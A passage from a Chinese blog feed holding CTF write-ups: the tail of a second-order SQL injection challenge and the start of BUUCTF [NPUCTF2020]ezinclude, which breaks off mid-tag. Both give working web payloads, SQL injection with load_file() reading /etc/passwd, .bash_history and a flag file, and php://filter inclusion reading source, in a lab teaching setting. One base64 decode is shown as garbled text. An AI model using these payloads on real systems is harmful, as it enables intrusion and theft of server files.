&#x27;$bo_id&#x27;<br></code></pre></td></tr></table></figure><h5 id="测试sql语句的正确性"><a href="#测试sql语句的正确性" class="headerlink" title="测试sql语句的正确性:"></a>测试sql语句的正确性:</h5><p>sql:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;666&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;<br></code></pre></td></tr></table></figure><p>这是一个有换行的sql语句，在php中有换行，在执行的时候也以换行的形式执行,由于我们需要插入bo_id的内容，不然整个逻辑会有错误，所以content需要为*&#x2F;#</p><p>(&#x2F;* *&#x2F;也为sql中的多行注释，#为注释后面内容只有#所在行)</p><p>sql2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;*/#&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;<br>&lt;=&gt;<br>insert into comment<br>            set category = &#x27;123&#x27;,content=database(),<br>                bo_id = &#x27;$bo_id&#x27;<br></code></pre></td></tr></table></figure><p>这样就可以注释掉content，同时保留bo_id</p><h4 id="抓取write的界面："><a href="#抓取write的界面：" class="headerlink" title="抓取write的界面："></a>抓取write的界面：</h4><p><img src="/images/2024-2-18/image-20240208195316538.png" alt="image-20240208195316538"></p><h4 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息:"></a>获取数据库信息:</h4><p>payload1:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=database(),/*&amp;content=666<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208204121356.png" alt="image-20240208204121356"></p><p><img src="/images/2024-2-18/image-20240208204155277.png" alt="image-20240208204155277"></p><h5 id="查看这条新插入的记录"><a href="#查看这条新插入的记录" class="headerlink" title="查看这条新插入的记录:"></a>查看这条新插入的记录:</h5><p><img src="/images/2024-2-18/image-20240208204226712.png" alt="image-20240208204226712"></p><h5 id="利用从数据库重新提取的数据，进行注入"><a href="#利用从数据库重新提取的数据，进行注入" class="headerlink" title="利用从数据库重新提取的数据，进行注入:"></a>利用从数据库重新提取的数据，进行注入:</h5><h6 id="payload2"><a href="#payload2" class="headerlink" title="payload2:"></a>payload2:</h6><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=6<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208204404395.png" alt="image-20240208204404395"></p><p><img src="/images/2024-2-18/image-20240208204413754.png" alt="image-20240208204413754"></p><p>成功获取到数据库信息为ctf</p><h4 id="查看表信息"><a href="#查看表信息" class="headerlink" title="查看表信息:"></a>查看表信息:</h4><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*&amp;content=666<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208211027230.png" alt="image-20240208211027230"></p><h5 id="payload2-1"><a href="#payload2-1" class="headerlink" title="payload2:"></a>payload2:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=7<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208211058023.png" alt="image-20240208211058023"></p><p>看了其他师傅的wp知道flag并不在数据库中，我们需要对网页的文件信息进行获取。</p><h2 id="获取网页的账户信息"><a href="#获取网页的账户信息" class="headerlink" title="获取网页的账户信息:"></a>获取网页的账户信息:</h2><h3 id="etc-passwd："><a href="#etc-passwd：" class="headerlink" title="&#x2F;etc&#x2F;passwd："></a>&#x2F;etc&#x2F;passwd：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">用于存储用户账户信息的文件。它包含了系统中所有用户账户的基本信息，每行对应一个用户账户，记录了该用户的用户名、加密后的密码（通常是 &quot;x&quot;，实际密码保存在 /etc/shadow 文件中）、用户 ID（UID）、组 ID（GID）、用户描述信息、主目录以及默认的 shell 等信息。<br><br>所以里面账户信息的格式一般为七个字段，分别表示：<br>(root:x:0:0:root:/root:/bin/bash)<br>1.用户名（username）：在这个例子中，用户名为 root。<br>2.密码占坑符（password placeholder）：在这里实际上是 x，表示密码已经被移动到了 /etc/shadow 文件中进行管理。<br>3.用户 ID（UID）：用户的数字标识符。在这里，0 表示 root 用户拥有系统上最高的权限级别（超级用户）。<br>4.组 ID（GID）：用户所属的主组的数字标识符，在这个例子中，0 代表该用户所属于的主组是 root。<br>5.用户信息（user information）：通常包含用户全名、联系方式等信息，但在这里是 /root，表示该用户的家目录在 /root 目录下。<br>6.Shell 程序（shell program）：当该用户登录后所使用的默认 shell，这里是 /bin/bash，表示该用户登录后会进入 Bash shell 终端程序。<br>7.其他（comment/other）：这个字段通常被忽略，用于存储关于该用户的备注信息。<br>需要注意的是，每行记录都以换行符结尾。/etc/passwd 文件中的每一行都对应着一个用户账户。这个文件通常只能由管理员或者超级用户访问和修改，因为它包含了系统上所有用户的敏感信息。<br></code></pre></td></tr></table></figure><h3 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1:"></a>payload1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(load_file(&quot;/etc/passwd&quot;))),/*&amp;content=666<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208212651712.png" alt="image-20240208212651712"></p><h3 id="payload2-2"><a href="#payload2-2" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=8<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208212737550.png" alt="image-20240208212737550"></p><h3 id="知识点介绍1"><a href="#知识点介绍1" class="headerlink" title="知识点介绍1:"></a>知识点介绍1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">我们通过对账户信息的查找，就可以去寻找关于www用户的相关信息<br>www用户（简单来讲就是在www文件夹下操作的用户，又或者可以说是用户在www文件夹下操作）:<br>www 用户是一个常见的用户账户名称，通常用于运行 Web 服务器进程（如 Apache、Nginx 等）。这个用户账户是为了提供 Web 服务而创建的，并且具有适当的权限和限制，以确保服务器的安全性。<br><br>一般情况下，www 用户账户具有以下特点：<br><br>用户名：www 或 www-data，具体名称可能因操作系统和配置而异。<br>用户组：通常会创建一个与用户名相同的用户组，例如 www 或 www-data 组。<br>主目录：可能是空的或者是 /var/www 或其他用于存储网站文件的目录。<br>Shell：在大多数情况下，该用户账户被设置为无法登录，即不允许交互式登录。<br>权限：www 用户通常只有对网站文件和相关资源的读取、执行权限，而没有写入权限。这样可以限制对服务器的访问和潜在的安全风险。<br>通过将 Web 服务器进程绑定到 www 用户账户，可以降低被入侵的风险，因为它最大程度地减少了对系统的访问权限。同时，这也有助于隔离 Web 服务器的进程和文件系统，提供更好的安全性和可维护性。<br></code></pre></td></tr></table></figure><p><strong>由于我们要获取的是网站的内部信息文件，而www用户是对网站的操作用户，所以知道它所在的目录位置就可以对网站的文件信息进行获取了</strong></p><h3 id="根据-etc-passwd："><a href="#根据-etc-passwd：" class="headerlink" title="根据&#x2F;etc&#x2F;passwd："></a>根据&#x2F;etc&#x2F;passwd：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">www:x:500:500:www:/home/www:/bin/bash<br></code></pre></td></tr></table></figure><p>可以确定www网站操作用户的信息在&#x2F;home&#x2F;www下</p><h3 id="知识点介绍2："><a href="#知识点介绍2：" class="headerlink" title="知识点介绍2："></a>知识点介绍2：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。<br>.bash_history 文件是一个 Bash shell 的历史命令记录文件，记录了用户在 Bash 终端中输入的所有命令。每当用户在 Bash 终端中执行一个命令，这个命令就会被保存到 .bash_history 文件中。这样，用户可以查看、编辑、重复执行以前执行过的命令。<br><br>.bash_history 文件通常存储在用户的 home 目录下，例如 Linux 系统下 /home/username/.bash_history，macOS 系统下 /Users/username/.bash_history。用户可以使用文本编辑器打开这个文件进行查看和编辑，也可以使用 Bash shell 提供的 history 命令来查看和操作历史命令。<br><br>需要注意的是，.bash_history 文件包含了用户在 Bash 终端中执行的所有命令，因此可能包含敏感信息（例如密码等），同时由于历史命令记录的存在，也可能被黑客利用来进行攻击。因此，为了保护用户的隐私和系统安全，建议定期清理 .bash_history 文件，或者禁用历史命令记录功能。<br></code></pre></td></tr></table></figure><p>通过查看该文件，我们就可以知道web操作用户的历史操作，从而知道该用户所使用过的文件</p><h4 id="payload1-2"><a href="#payload1-2" class="headerlink" title="payload1:"></a>payload1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/*&amp;content=666<br></code></pre></td></tr></table></figure><h4 id="payload2-3"><a href="#payload2-3" class="headerlink" title="payload2:"></a>payload2:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=9<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208220114550.png" alt="image-20240208220114550"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">cd /tmp/ #切换到tmp目录下<br>unzip html.zip #解压缩html.zip文件<br>rm -f html.zip #强制删除html.zip文件<br>cp -r html /var/www/ #将html目录复制到/var/www/=&gt;形成/var/www/html/<br>cd /var/www/html/ #切换到var/www/html/目录下<br>rm -f .DS_Store #强制删除.DS_Store<br>service apache2 start #启动apache服务<br></code></pre></td></tr></table></figure><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">html.zip中的文件，就是www用户上传到网页上的文件内容，虽然html.zip文件被删除，但是切换到html文件夹下后，其实就是默认为一个html用户在html文件夹下进行操作解压html.zip为html的过程中，会在html文件中产生解压历史的文件.DS_Store,所以这也就是为什么要切换到html目录下删除.DS_Store文件，<br><br>.DS_Store:(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。通过.DS_Store可以知道这个目录里面所有文件的清单。<br><br>但是这里用户只删除了html文件夹下的.DS_Store文件，而html文件是在/tmp/目录下解压得到的，然后再复制到/var/www下的，所以/tmp/html/目录下还存在.DS_Store文件，我们可以对其进行获取。<br></code></pre></td></tr></table></figure><h2 id="获取-tmp-html-目录下的-DS-Store文件："><a href="#获取-tmp-html-目录下的-DS-Store文件：" class="headerlink" title="获取&#x2F;tmp&#x2F;html&#x2F;目录下的.DS_Store文件："></a>获取&#x2F;tmp&#x2F;html&#x2F;目录下的.DS_Store文件：</h2><h3 id="paylaod1"><a href="#paylaod1" class="headerlink" title="paylaod1:"></a>paylaod1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*&amp;content=666<br></code></pre></td></tr></table></figure><h3 id="payload2-4"><a href="#payload2-4" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=12<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208223425313.png" alt="image-20240208223425313"></p><p>发现文件内容没有完全显示，可能是由于文件太大或存在乱码，不能完全显示，所以我们用十六进制编码获取文件信息</p><h2 id="使用16进制编码获取文件信息"><a href="#使用16进制编码获取文件信息" class="headerlink" title="使用16进制编码获取文件信息:"></a>使用16进制编码获取文件信息:</h2><h3 id="paylaod1-1"><a href="#paylaod1-1" class="headerlink" title="paylaod1:"></a>paylaod1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=((select(hex(load_file(&quot;/tmp/html/.DS_Store&quot;))))),/*&amp;content=666<br></code></pre></td></tr></table></figure><h3 id="payload2-5"><a href="#payload2-5" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=15<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208224046928.png" alt="image-20240208224046928"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txtbr></code></pre></td></tr></table></figure><h3 id="16进制解码"><a href="#16进制解码" class="headerlink" title="16进制解码:"></a>16进制解码:</h3><p><strong>使用bp的ascii码16进制解码</strong></p><p><img src="/images/2024-2-18/image-20240208224711172.png" alt="image-20240208224711172"></p><p>对这些项目文件进行观察，发现一个跟flag相关的文件:</p><p><img src="/images/2024-2-18/image-20240208224815804.png" alt="image-20240208224815804"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag_8946e1ff1ee3e40f.php<br></code></pre></td></tr></table></figure><p>该文件存在于&#x2F;tmp&#x2F;html&#x2F;目录下以及&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下，获取这两个目录中的任意一个文件就可以了</p><h2 id="获取-tmp-html-目录下的flag-8946e1ff1ee3e40f-php："><a href="#获取-tmp-html-目录下的flag-8946e1ff1ee3e40f-php：" class="headerlink" title="获取&#x2F;tmp&#x2F;html&#x2F;目录下的flag_8946e1ff1ee3e40f.php："></a>获取&#x2F;tmp&#x2F;html&#x2F;目录下的flag_8946e1ff1ee3e40f.php：</h2><h3 id="payload1-3"><a href="#payload1-3" class="headerlink" title="payload1:"></a>payload1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=((select(hex(load_file(&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;))))),/*&amp;content=666<br></code></pre></td></tr></table></figure><h3 id="payload2-6"><a href="#payload2-6" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=16<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208225236611.png" alt="image-20240208225236611"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">3C3F7068700A24666C6167203D2027666C61677B66396361316136622D396437382D313165382D393061332D6334623330316237623939627D273B0A3F3E0A<br></code></pre></td></tr></table></figure><h3 id="16进制解码-1"><a href="#16进制解码-1" class="headerlink" title="16进制解码:"></a>16进制解码:</h3><p><img src="/images/2024-2-18/image-20240208225359567.png" alt="image-20240208225359567"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br>$flag = &#x27;flag&#123;f9ca1a6b-9d78-11e8-90a3-c4b301b7b99b&#125;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{f9ca1a6b-9d78-11e8-90a3-c4b301b7b99b}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[NPUCTF2020]ezinclude</title>
    <link href="/2024/02/18/2024-02-18-%5BNPUCTF2020%5Dezinclude/"/>
    <url>/2024/02/18/2024-02-18-%5BNPUCTF2020%5Dezinclude/</url>
    
    <content type="html"><![CDATA[<h1 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>[<a href="https://blog.csdn.net/weixin_45646006/article/details/120817553">NPUCTF2020]ezinclude-CSDN博客</a></p><p><a href="https://github.com/H4ckForJob/dirmap/blob/master/data/">https://github.com/H4ckForJob/dirmap/blob/master/data/</a></p><p>[<a href="https://www.shawroot.cc/1159.html">NPUCTF2020]ezinclude（PHP临时文件包含） – 「配枪朱丽叶。」 (shawroot.cc)</a></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240206143845264.png" alt="image-20240206143845264"></p><h2 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码:"></a>查看网页源代码:</h2><p><img src="/images/2024-2-18/image-20240206143907330.png" alt="image-20240206143907330"></p><p>得到提示信息:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;!--md5($secret.$name)===$pass --&gt;<br></code></pre></td></tr></table></figure><p>这里要求我们$secret.$name的md5值要和$pass相等</p><h3 id="猜测"><a href="#猜测" class="headerlink" title="猜测:"></a>猜测:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">如果$name和$pass的参数我们不可控，那么我们将无法绕过这个判断，即这个提示就没有任何的意义(因为我已经对网站的后台文件都进行扫描还是没有发现什么有用的文件)，所以这两个参数必须可控，现在假设我们可以输入这两个参数的值，$name我们输入一个值，那么我们也需要知道$secret.$name的md5的值才可以输入$pass的值，如果我们先输入$pass的值，但是由于不知道$secret的值，所以无法输入$name的值，所以如果要让这个提示存在意义，那么就是我们输入$name的值，同时获取到$secret.$name的加密值<br></code></pre></td></tr></table></figure><h2 id="BP抓包进一步收集信息"><a href="#BP抓包进一步收集信息" class="headerlink" title="BP抓包进一步收集信息:"></a>BP抓包进一步收集信息:</h2><p><img src="/images/2024-2-18/image-20240206144517403.png" alt="image-20240206144517403"></p><p>发现cookie存在一个hash值</p><h3 id="随意输入一个name的值"><a href="#随意输入一个name的值" class="headerlink" title="随意输入一个name的值:"></a>随意输入一个name的值:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=1<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206144623159.png" alt="image-20240206144623159"></p><p>发现响应结果中存在一个Set-Cookie: Hash&#x3D;576322dd496b99d07b5b0f7fa7934a25;</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=2<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206144721294.png" alt="image-20240206144721294"></p><p>发现不同的name回显不同的set-cookie值，猜测该hash值就是$secret.$name的md5加密值</p><h2 id="验证猜测"><a href="#验证猜测" class="headerlink" title="验证猜测:"></a>验证猜测:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206144858912.png" alt="image-20240206144858912"></p><p>成功回显一个文件信息:flflflflag.php</p><h2 id="访问flflflflag-php："><a href="#访问flflflflag-php：" class="headerlink" title="访问flflflflag.php："></a>访问flflflflag.php：</h2><p><img src="/images/2024-2-18/image-20240206145214434.png" alt="image-20240206145214434"></p><p>直接跳转到404.html上了，没有访问flflflflag.php，可能是直接进行跳转了，可以用抓包拦截一下</p><h2 id="BP抓包拦截flflflflag-php："><a href="#BP抓包拦截flflflflag-php：" class="headerlink" title="BP抓包拦截flflflflag.php："></a>BP抓包拦截flflflflag.php：</h2><p><img src="/images/2024-2-18/image-20240206145342309.png" alt="image-20240206145342309"></p><p>根据响应包内容确实获取到，访问该页面时会自动跳转到404.html,同时获得提示信息:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">include($_GET[&quot;file&quot;])<br></code></pre></td></tr></table></figure><p>该文件存在文件包含漏洞</p><h2 id="构造文件包含payload"><a href="#构造文件包含payload" class="headerlink" title="构造文件包含payload:"></a>构造文件包含payload:</h2><p><strong>由于我们现在只知道一个index.php和flflflflag.php，所以先获取这两个文件的信息</strong></p><h3 id="获取flflflflag-php信息payload1"><a href="#获取flflflflag-php信息payload1" class="headerlink" title="获取flflflflag.php信息payload1:"></a>获取flflflflag.php信息payload1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./flflflflag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206145854174.png" alt="image-20240206145854174"></p><h4 id="回显内容"><a href="#回显内容" class="headerlink" title="回显内容:"></a>回显内容:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PGh0bWw+CjxoZWFkPgo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0IiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmPSI0MDQuaHRtbCI7Cjwvc2NyaXB0Pgo8dGl0bGU+dGhpc19pc19ub3RfZmw0Z19hbmRf5Ye66aKY5Lq6X3dhbnRzX2dpcmxmcmllbmQ8L3RpdGxlPgo8L2hlYWQ+Cjw+Cjxib2R5Pgo8P3BocAokZmlsZT0kX0dFVFsnZmlsZSddOwppZihwcmVnX21hdGNoKCcvZGF0YXxpbnB1dHx6aXAvaXMnLCRmaWxlKSl7CglkaWUoJ25vbm9ubycpOwp9CkBpbmNsdWRlKCRmaWxlKTsKZWNobyAnaW5jbHVkZSgkX0dFVFsiZmlsZSJdKSc7Cj8+CjwvYm9keT4KPC9odG1sPgo=<br></code></pre></td></tr></table></figure><h4 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码:"></a>base64解码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;script language=<span class="hljs-string">&quot;javascript&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>           window.location.href=<span class="hljs-string">&quot;404.html&quot;</span>;<br>&lt;/script&gt;<br>&lt;title&gt;this_is_not_fl4g_and_鍑洪浜篲wants_girlfriend&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>&#125;<br>@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="获取index-php文件信息paylaod2"><a href="#获取index-php文件信息paylaod2" class="headerlink" title="获取index.php文件信息paylaod2:"></a>获取index.php文件信息paylaod2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206150245971.png" alt="image-20240206150245971"></p><h4 id="回显内容-1"><a href="#回显内容-1" class="headerlink" title="回显内容:"></a>回显内容:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHAKaW5jbHVkZSAnY29uZmlnLnBocCc7CkAkbmFtZT0kX0dFVFsnbmFtZSddOwpAJHBhc3M9JF9HRVRbJ3Bhc3MnXTsKaWYobWQ1KCRzZWNyZXQuJG5hbWUpPT09JHBhc3MpewoJZWNobyAnPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZj0iZmxmbGZsZmxhZy5waHAiOwoJPC9zY3JpcHQ Cic7Cn1lbHNlewoJc2V0Y29va2llKCJIYXNoIixtZDUoJHNlY3JldC4kbmFtZSksdGltZSgpKzM2MDAwMDApOwoJZWNobyAidXNlcm5hbWUvcGFzc3dvcmQgZXJyb3IiOwp9Cj8 CjxodG1sPgo8IS0tbWQ1KCRzZWNyZXQuJG5hbWUpPT09JHBhc3MgLS0 CjwvaHRtbD4K<br></code></pre></td></tr></table></figure><h4 id="base64解码-1"><a href="#base64解码-1" class="headerlink" title="base64解码:"></a>base64解码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br>@<span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>@<span class="hljs-variable">$pass</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>.<span class="hljs-variable">$name</span>)===<span class="hljs-variable">$pass</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="hljs-string">           window.location.href=&quot;flflflflag.php&quot;;</span><br><span class="hljs-string">&lt;/script壩聼Y[賌聜\賋圹谮YJ?\??Y</span><br><span class="hljs-string">J賆軝]?榌YJK[YJ</span><br><span class="hljs-string">J掏?</span><br><span class="hljs-string">N聜YX??漒賊洏[YK?\茌圮?\湜軋幝烞徖Ｆ嘑置啵?抑諧R侴6V7&amp;WB釬?諶撚右G72倚(鸾⊙蛋?</span><br></code></pre></td></tr></table></figure><p>发现存在一个config.php,我们可以读取一下</p><h3 id="获取config-php信息payload3"><a href="#获取config-php信息payload3" class="headerlink" title="获取config.php信息payload3:"></a>获取config.php信息payload3:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span 